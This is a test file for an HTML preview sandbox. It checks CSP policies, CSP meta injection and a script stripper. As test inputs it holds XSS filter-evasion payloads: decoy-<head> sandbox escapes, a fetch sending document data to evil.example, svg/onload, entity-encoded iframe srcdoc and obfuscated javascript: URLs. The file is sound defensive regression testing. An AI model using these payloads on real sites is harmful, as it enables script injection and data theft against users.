import {
  PDF_PREVIEW_CSP,
  PREVIEW_CSP,
  PREVIEW_CSP_INLINE,
  PREVIEW_CSP_LIVE,
  escapeForInlineJsTemplate,
  htmlDependsOnNetwork,
  injectPreviewCsp,
  prepareHtmlRunDocument,
  stripScripts,
} from "@/lib/previewSandbox";

describe("PREVIEW_CSP", () => {
  it("blocks network egress and forms, allows inline scripts only", () => {
    expect(PREVIEW_CSP).toContain("default-src 'none'");
    expect(PREVIEW_CSP).toContain("script-src 'unsafe-inline'");
    expect(PREVIEW_CSP).toContain("style-src 'unsafe-inline'");
    expect(PREVIEW_CSP).toContain("connect-src 'none'");
    expect(PREVIEW_CSP).toContain("form-action 'none'");
    expect(PREVIEW_CSP).toContain("base-uri 'none'");
    expect(PREVIEW_CSP).toContain("sandbox allow-scripts");
  });

  it("PREVIEW_CSP_INLINE keeps egress locks without meta sandbox", () => {
    expect(PREVIEW_CSP_INLINE).toContain("connect-src 'none'");
    expect(PREVIEW_CSP_INLINE).not.toContain("sandbox");
    expect(PREVIEW_CSP.startsWith(PREVIEW_CSP_INLINE)).toBe(true);
  });

  it("PREVIEW_CSP_LIVE allows https subresources for HTML Run demos", () => {
    expect(PREVIEW_CSP_LIVE).toContain("script-src 'unsafe-inline' https: http:");
    expect(PREVIEW_CSP_LIVE).toContain("style-src 'unsafe-inline' https: http:");
    expect(PREVIEW_CSP_LIVE).toContain("connect-src https: http:");
    expect(PREVIEW_CSP_LIVE).toContain("form-action 'none'");
    expect(PREVIEW_CSP_LIVE).not.toContain("sandbox");
  });
});

describe("prepareHtmlRunDocument", () => {
  it("injects live CSP and stay-on-page script", () => {
    const out = prepareHtmlRunDocument(
      "<!DOCTYPE html><html><head></head><body><h1>Hi</h1></body></html>",
    );
    expect(out).toContain("Content-Security-Policy");
    expect(out).toContain("connect-src https: http:");
    expect(out).toContain("addEventListener(\"click\"");
    expect(out).toContain("<h1>Hi</h1>");
  });
});

describe("htmlDependsOnNetwork", () => {
  it("detects http(s) script/link/img and css urls", () => {
    expect(htmlDependsOnNetwork('<script src="https://cdn.example/x.js">')).toBe(
      true,
    );
    expect(htmlDependsOnNetwork('<link href="http://x/y.css" rel="stylesheet">')).toBe(
      true,
    );
    expect(htmlDependsOnNetwork("body{background:url(https://x/a.png)}")).toBe(true);
    expect(
      htmlDependsOnNetwork("<style>h1{color:red}</style><h1>hi</h1>"),
    ).toBe(false);
  });
});

describe("PREVIEW_CSP egress details", () => {
  it("blocks https on script/style (external script-src exfiltration)", () => {
    // connect-src 'none' alone is not enough: <script src="https://evil/?…">
    // still fires a GET. Inline-only preview — no CDN hosts.
    const scriptSrc = PREVIEW_CSP.match(/script-src\s+([^;]+)/)?.[1].trim();
    const styleSrc = PREVIEW_CSP.match(/style-src\s+([^;]+)/)?.[1].trim();
    expect(scriptSrc).toBe("'unsafe-inline'");
    expect(styleSrc).toBe("'unsafe-inline'");
    for (const value of [scriptSrc, styleSrc]) {
      expect(value).not.toContain("https:");
      expect(value).not.toContain("*");
    }
  });

  it("blocks https on img/font/media (passive GET exfiltration)", () => {
    // connect-src 'none' alone is not enough: <img src="https://attacker/…">
    // still fires a GET when the DOM parses. Mermaid/Charts inherit this CSP.
    const imgSrc = PREVIEW_CSP.match(/img-src\s+([^;]+)/)?.[1].trim();
    const fontSrc = PREVIEW_CSP.match(/font-src\s+([^;]+)/)?.[1].trim();
    const mediaSrc = PREVIEW_CSP.match(/media-src\s+([^;]+)/)?.[1].trim();
    expect(imgSrc).toBe("data: blob:");
    expect(fontSrc).toBe("data:");
    expect(mediaSrc).toBe("data: blob:");
    for (const value of [imgSrc, fontSrc, mediaSrc]) {
      expect(value).not.toContain("https:");
      expect(value).not.toContain("*");
    }
  });
});

describe("PDF_PREVIEW_CSP", () => {
  it("allows a blob worker (pdf.js worker is vendored inline) and blocks all network egress", () => {
    // pdf.js + its worker are vendored and inlined; the worker is built from a
    // Blob URL at runtime, so the CSP must allow `worker-src blob:` while
    // keeping `connect-src 'none'` (no network fetch is needed — the PDF bytes
    // are inlined as base64).
    expect(PDF_PREVIEW_CSP).toContain("worker-src blob:");
    expect(PDF_PREVIEW_CSP).toContain("connect-src 'none'");
  });

  it("keeps the rest of the policy as locked-down as PREVIEW_CSP", () => {
    expect(PDF_PREVIEW_CSP).toContain("default-src 'none'");
    expect(PDF_PREVIEW_CSP).toContain("script-src 'unsafe-inline'");
    expect(PDF_PREVIEW_CSP).not.toContain("script-src 'unsafe-inline' https:");
    expect(PDF_PREVIEW_CSP).toContain("form-action 'none'");
    expect(PDF_PREVIEW_CSP).toContain("base-uri 'none'");
    expect(PDF_PREVIEW_CSP).toContain("sandbox allow-scripts");
  });

  it("does NOT allow connect-src to any origin (no exfiltration, no CDN)", () => {
    // The connect-src must be 'none' — not 'https:' (any HTTPS origin), not a
    // CDN host, not '*'. pdf.js no longer fetches anything at runtime.
    const connectSrcMatch = PDF_PREVIEW_CSP.match(/connect-src\s+([^;]+)/);
    expect(connectSrcMatch).not.toBeNull();
    const connectSrcValue = connectSrcMatch![1].trim();
    expect(connectSrcValue).toBe("'none'");
    expect(connectSrcValue).not.toBe("https:");
    expect(connectSrcValue).not.toBe("*");
    expect(connectSrcValue).not.toContain("cdnjs.cloudflare.com");
  });

  it("allows worker-src only for blob: (not arbitrary origins)", () => {
    const workerSrcMatch = PDF_PREVIEW_CSP.match(/worker-src\s+([^;]+)/);
    expect(workerSrcMatch).not.toBeNull();
    const workerSrcValue = workerSrcMatch![1].trim();
    expect(workerSrcValue).toBe("blob:");
  });
});

describe("escapeForInlineJsTemplate", () => {
  it("escapes backslashes before backticks so a trailing slash cannot break out", () => {
    expect(escapeForInlineJsTemplate("a\\")).toBe("a\\\\");
    expect(escapeForInlineJsTemplate("x`y")).toBe("x\\`y");
    expect(escapeForInlineJsTemplate("${hi}")).toBe("\\${hi}");
  });
});

describe("injectPreviewCsp", () => {
  it("injects the CSP meta right after an existing <head>", () => {
    const html = "<!DOCTYPE html><html><head><title>x</title></head><body></body></html>";
    const out = injectPreviewCsp(html);
    expect(out).toContain(
      `<head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}"><title>x</title></head>`,
    );
  });

  it("injects a <head> with CSP after <html> when no head present", () => {
    const html = "<!DOCTYPE html><html><body><p>hi</p></body></html>";
    const out = injectPreviewCsp(html);
    expect(out).toContain(
      `<html><head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}"></head><body>`,
    );
  });

  it("wraps bare HTML into a document with the CSP", () => {
    const out = injectPreviewCsp("<p>hello</p>");
    expect(out).toContain(`<head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}"></head>`);
    expect(out).toContain("<p>hello</p>");
  });

  it("only injects a single CSP meta (idempotent-ish for one pass)", () => {
    const html = "<html><head></head><body></body></html>";
    const out = injectPreviewCsp(html);
    const count = (out.match(/Content-Security-Policy/g) || []).length;
    expect(count).toBe(1);
  });

  it("strips scripts that appear before <head> (meta CSP would not cover them)", () => {
    const html =
      "<html><script>window.pwned=1</script><head><title>x</title></head><body></body></html>";
    const out = injectPreviewCsp(html);
    expect(out).not.toContain("window.pwned");
    expect(out).toContain(`content="${PREVIEW_CSP}"`);
  });

  // BUG FIX (was a confirmed sandbox escape): a decoy "<head" inside a
  // <script> comment (or <style>/HTML comment/<textarea>/<title>) that
  // appears before the real <head> used to fool the plain-text search into
  // splicing the CSP meta into that inert block instead — leaving the real
  // document with no CSP at all, and the attacker's script running with
  // full network egress despite connect-src 'none'. Each case below is the
  // exact confirmed PoC shape; the CSP must land inside the REAL <head>,
  // and the decoy content must never be treated as if it were real markup.
  it("is not fooled by a decoy <head> inside a <script> comment", () => {
    const html =
      '<!DOCTYPE html><html><script>\n// <head>\nfetch("https://evil.example/steal?x=" + document.title);\n</script>\n<head><title>Legit</title></head><body>Hello</body></html>';
    const out = injectPreviewCsp(html);
    // The CSP must be inside the real <head>, immediately before <title>.
    expect(out).toContain(`<head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}"><title>Legit</title></head>`);
    // The attacker's script must be gone entirely (it's "before head").
    expect(out).not.toContain("evil.example");
  });

  it("is not fooled by a decoy <head> inside a <style> block", () => {
    const html =
      '<!DOCTYPE html><html><style>/* <head> */ body { color: red; }</style><head><title>Real</title></head><body></body></html>';
    const out = injectPreviewCsp(html);
    expect(out).toContain(`<head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}"><title>Real</title></head>`);
  });

  it("is not fooled by a decoy <head> inside an HTML comment", () => {
    const html =
      "<!DOCTYPE html><html><!-- <head> --><head><title>Real</title></head><body></body></html>";
    const out = injectPreviewCsp(html);
    expect(out).toContain(`<head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}"><title>Real</title></head>`);
  });

  it("is not fooled by a decoy <head> inside a <textarea>", () => {
    const html =
      "<!DOCTYPE html><html><textarea>sample: <head> tag</textarea><head><title>Real</title></head><body></body></html>";
    const out = injectPreviewCsp(html);
    expect(out).toContain(`<head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}"><title>Real</title></head>`);
  });
});

describe("stripScripts", () => {
  it("strips plain <script> tags and on*= handlers (baseline, unchanged)", () => {
    const out = stripScripts('<script>alert(1)</script><div onclick="alert(2)">x</div>');
    expect(out).not.toContain("<script>");
    expect(out).not.toContain("alert(1)");
    expect(out).not.toContain("onclick");
  });

  // BUG FIX (was a confirmed bypass): "/" is a valid inter-attribute
  // separator in HTML, not just whitespace, so <svg/onload=...> fires
  // automatically on render — a well-known, real-world XSS-filter-evasion
  // technique. The old regex required literal whitespace before "on\w+".
  it("strips on*= handlers separated by '/' instead of whitespace", () => {
    const out = stripScripts('<svg/onload=alert(document.domain)>');
    expect(out).not.toContain("onload");
    expect(out).not.toContain("alert(document.domain)");
  });

  // BUG FIX (was a confirmed bypass): browsers HTML-decode an iframe's
  // srcdoc attribute before parsing it as the iframe's own document, so an
  // entity-encoded <script> inside srcdoc executes on load with zero
  // clicks. The old code only looked for the literal string "<script",
  // never inside an attribute value.
  it("strips iframe srcdoc containing an entity-encoded script", () => {
    const out = stripScripts(
      '<iframe srcdoc="&lt;script&gt;fetch(&#39;https://evil.example&#39;)&lt;/script&gt;"></iframe>',
    );
    expect(out).not.toContain("srcdoc");
  });

  it("strips javascript: URLs from href/src/action/formaction/data attributes", () => {
    const cases = [
      '<a href="javascript:alert(1)">click</a>',
      "<a href='javascript:alert(1)'>click</a>",
      '<img src="javascript:alert(1)">',
      '<form action="javascript:alert(1)"><button formaction="javascript:alert(1)">go</button></form>',
      '<object data="javascript:alert(1)"></object>',
    ];
    for (const html of cases) {
      const out = stripScripts(html);
      expect(out.toLowerCase()).not.toContain("javascript:");
    }
  });

  it("strips javascript: URLs obfuscated with embedded whitespace/control characters", () => {
    const out = stripScripts('<a href="java\tscript:alert(1)">click</a>');
    expect(out.toLowerCase()).not.toContain("javascript:");
  });

  it("strips vbscript: URLs", () => {
    const out = stripScripts('<a href="vbscript:msgbox(1)">click</a>');
    expect(out.toLowerCase()).not.toContain("vbscript:");
  });

  it("strips zero-click meta-refresh redirects", () => {
    const out = stripScripts(
      '<meta http-equiv="refresh" content="0;url=https://evil.example/phish">',
    );
    expect(out).not.toContain("evil.example");
    expect(out.toLowerCase()).not.toContain("refresh");
  });

  it("leaves ordinary safe links and images untouched", () => {
    const out = stripScripts(
      '<a href="https://example.com">link</a><img src="https://example.com/x.png"><img src="data:image/png;base64,AAAA">',
    );
    expect(out).toContain('href="https://example.com"');
    expect(out).toContain('src="https://example.com/x.png"');
    expect(out).toContain('src="data:image/png;base64,AAAA"');
  });

  it("strips data:text/html URLs while keeping data:image", () => {
    const out = stripScripts(
      '<a href="data:text/html,<script>alert(1)</script>">x</a><img src="data:image/png;base64,AAAA">',
    );
    expect(out.toLowerCase()).not.toContain("data:text/html");
    expect(out).toContain('src="data:image/png;base64,AAAA"');
  });

  it("strips script end tags with junk before >", () => {
    const out = stripScripts("<script>alert(1)</script\t\n bar><p>ok</p>");
    expect(out.toLowerCase()).not.toContain("alert");
    expect(out).toContain("<p>ok</p>");
  });
});
